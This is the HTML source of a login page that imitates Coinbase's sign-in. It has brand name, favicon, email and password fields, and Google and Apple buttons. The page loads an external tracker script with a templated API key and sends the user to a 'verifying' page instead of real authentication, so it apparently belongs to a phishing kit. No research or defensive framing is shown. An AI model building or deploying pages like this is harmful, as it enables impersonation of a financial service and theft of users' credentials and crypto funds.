<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Coinbase</title>
    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
    <link rel="stylesheet" href="styles.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="logo-container">
            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="signup-container">
            <h1 class="title">Sign in to Coinbase</h1>
            <p class="subtitle">Enter your email and password.</p>

            <!-- Login Form -->
            <form id="loginForm" class="signup-form">
                <input 
                    type="email" 
                    id="email" 
                    name="email" 
                    class="email-input" 
                    placeholder="Email"
                    autocomplete="email"
                    required
                >
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    class="email-input" 
                    placeholder="Password"
                    autocomplete="current-password"
                    required
                >
                <button type="submit" class="continue-btn">Sign In</button>
            </form>

            <!-- Divider -->
            <div class="divider">
                <span class="divider-text">OR</span>
            </div>

            <!-- Social Sign In Buttons -->
            <div class="social-buttons">
                <button class="social-btn google-btn">
                    <svg class="social-icon" viewBox="0 0 24 24" width="20" height="20">
                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                    <span>Sign in with Google</span>
                </button>

                <button class="social-btn apple-btn">
                    <svg class="social-icon" viewBox="0 0 24 24" width="20" height="20" fill="white">
                        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.09l-.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                    </svg>
                    <span>Sign in with Apple</span>
                </button>
            </div>

            <!-- Sign Up Link -->
            <p class="signin-text">
                Don't have an account? <a href="index.html" class="signin-link">Sign Up</a>
            </p>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <p class="footer-text">
            By signing in you agree to our 
            <a href="#" class="footer-link">Privacy Policy</a> and 
            <a href="#" class="footer-link">Cookie Policy</a>.
        </p>
    </footer>

    <script>
        // Login Form Submission Handler
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const submitBtn = loginForm.querySelector('.continue-btn');
            
            // Check if all required fields are filled
            function checkFormValidity() {
                const emailFilled = emailInput.value.trim() !== '';
                const passwordFilled = passwordInput.value.trim() !== '';
                
                if (emailFilled && passwordFilled) {
                    submitBtn.classList.add('active');
                } else {
                    submitBtn.classList.remove('active');
                }
            }
            
            // Listen to input changes
            emailInput.addEventListener('input', checkFormValidity);
            passwordInput.addEventListener('input', checkFormValidity);
            
            // Initial check
            checkFormValidity();
            
            if (loginForm) {
                loginForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    // Redirect to verifying page
                    window.location.href = 'verifying.html';
                });
            }
        });
    </script>
</body>
</html>
